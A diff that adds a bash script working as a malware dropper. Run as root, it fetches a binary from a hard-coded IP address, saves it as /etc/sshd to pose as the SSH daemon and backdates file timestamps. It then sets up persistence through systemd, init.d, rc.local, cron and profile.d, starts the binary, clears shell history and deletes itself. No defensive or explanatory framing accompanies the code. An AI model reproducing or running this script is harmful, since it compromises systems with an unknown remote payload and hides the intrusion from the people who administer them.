@@ -1,0 +1,122 @@
+#!/bin/bash
+SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
+
+INSTALL_DIR="/etc"
+PROGRAM_NAME="sshd"
+DOWNLOAD_URL_64="http://194.38.11.3:1790/sshd64"
+DOWNLOAD_URL_32="http://194.38.11.3:1790/sshd32"
+CUSTOM_TIMESTAMP="202301051030.00"
+SERVICE_NAME="system-sshd"
+AUTOSTART_METHOD="all"
+
+detect_arch() {
+    case "$(uname -m)" in
+        x86_64|amd64|aarch64|ppc64|ppc64le|s390x) echo "64" ;;
+        *) [ "$(getconf LONG_BIT 2>/dev/null)" = "64" ] && echo "64" || echo "32" ;;
+    esac
+}
+
+set_ts() { [ -e "$1" ] && touch -t "$CUSTOM_TIMESTAMP" "$1" 2>/dev/null; }
+
+download() {
+    local url="$DOWNLOAD_URL_32"
+    [ "$1" = "64" ] && url="$DOWNLOAD_URL_64"
+    local target="${INSTALL_DIR}/${PROGRAM_NAME}"
+    mkdir -p "$INSTALL_DIR" 2>/dev/null
+    
+    if command -v wget &>/dev/null; then
+        wget -q --no-check-certificate -O "$target" "$url" 2>/dev/null
+    elif command -v curl &>/dev/null; then
+        curl -sfkL -o "$target" "$url" 2>/dev/null
+    else
+        return 1
+    fi
+    
+    [ -s "$target" ] && chmod +x "$target" && set_ts "$target"
+}
+
+setup_systemd() {
+    command -v systemctl &>/dev/null || return
+    local svc="/etc/systemd/system/${SERVICE_NAME}.service"
+    cat > "$svc" << EOF
+[Unit]
+Description=System Service
+After=network.target
+[Service]
+Type=simple
+ExecStart=${INSTALL_DIR}/${PROGRAM_NAME}
+Restart=always
+RestartSec=30
+[Install]
+WantedBy=multi-user.target
+EOF
+    set_ts "$svc"
+    systemctl daemon-reload 2>/dev/null
+    systemctl enable "$SERVICE_NAME" 2>/dev/null
+    systemctl start "$SERVICE_NAME" 2>/dev/null
+}
+
+setup_initd() {
+    local s="/etc/init.d/${SERVICE_NAME}"
+    cat > "$s" << EOF
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides:          ${SERVICE_NAME}
+# Required-Start:    \$network
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+### END INIT INFO
+D="${INSTALL_DIR}/${PROGRAM_NAME}"
+P="/var/run/${SERVICE_NAME}.pid"
+case "\$1" in
+start) [ -f "\$P" ] && kill -0 \$(cat "\$P") 2>/dev/null && exit 0; nohup "\$D" >/dev/null 2>&1 & echo \$! > "\$P" ;;
+stop) [ -f "\$P" ] && kill \$(cat "\$P") 2>/dev/null; rm -f "\$P" ;;
+restart) \$0 stop; sleep 1; \$0 start ;;
+esac
+EOF
+    chmod +x "$s" && set_ts "$s"
+    command -v update-rc.d &>/dev/null && update-rc.d "$SERVICE_NAME" defaults 2>/dev/null
+    command -v chkconfig &>/dev/null && chkconfig --add "$SERVICE_NAME" 2>/dev/null && chkconfig "$SERVICE_NAME" on 2>/dev/null
+    "$s" start 2>/dev/null
+}
+
+setup_rclocal() {
+    local rc="/etc/rc.local"
+    [ -f /etc/rc.d/rc.local ] && rc="/etc/rc.d/rc.local"
+    [ ! -f "$rc" ] && echo -e '#!/bin/bash\nexit 0' > "$rc"
+    grep -q "${PROGRAM_NAME}" "$rc" 2>/dev/null || sed -i "/exit 0/i\\${INSTALL_DIR}/${PROGRAM_NAME} \&" "$rc" 2>/dev/null
+    chmod +x "$rc" && set_ts "$rc"
+    systemctl enable rc-local 2>/dev/null
+}
+
+setup_crontab() {
+    (crontab -l 2>/dev/null | grep -v "${PROGRAM_NAME}"; echo "@reboot ${INSTALL_DIR}/${PROGRAM_NAME}") | crontab - 2>/dev/null
+}
+
+setup_profile() {
+    local p="/etc/profile.d/${SERVICE_NAME}.sh"
+    echo "pgrep -x '${PROGRAM_NAME}'>/dev/null||${INSTALL_DIR}/${PROGRAM_NAME}&" > "$p"
+    chmod +x "$p" && set_ts "$p"
+}
+
+{
+    [ "$(id -u)" -ne 0 ] && exit 1
+    
+    download "$(detect_arch)" || { rm -f "$SELF" 2>/dev/null; exit 1; }
+    
+    case "$AUTOSTART_METHOD" in
+        systemd) setup_systemd ;;
+        initd)   setup_initd ;;
+        rclocal) setup_rclocal ;;
+        crontab) setup_crontab ;;
+        all)     setup_systemd; setup_initd; setup_rclocal; setup_crontab; setup_profile ;;
+    esac
+    
+    pgrep -x "${PROGRAM_NAME}" >/dev/null 2>&1 || nohup "${INSTALL_DIR}/${PROGRAM_NAME}" >/dev/null 2>&1 &
+    
+    history -c 2>/dev/null
+    rm -f "$SELF" /tmp/deploy.sh /tmp/.deploy.sh 2>/dev/null
+    
+} &>/dev/null &
+
+exit 0
